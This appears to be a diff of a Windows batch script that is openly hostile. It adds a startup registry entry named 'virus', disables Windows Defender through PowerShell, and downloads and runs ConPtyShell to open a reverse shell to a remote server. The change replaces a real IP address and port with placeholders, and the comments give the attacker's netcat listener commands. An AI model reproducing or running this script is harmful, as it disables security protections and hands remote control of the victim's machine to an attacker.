@@ -16,7 +16,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "virus" /t REG_S
 :: PowerShell -Command "Set-MpPreference -MAPSReporting 0"
 :: PowerShell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
 powershell.exe -ExecutionPolicy Bypass -Command "New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
-powershell.exe -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.190.242.161 87"
+powershell.exe -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell YOUR_SERVER_IP PORT"
 
 ::server: nc -lvnp 87
 ::server(tgt=win): stty raw -echo; (stty size; cat) | sudo nc -lvnp 87
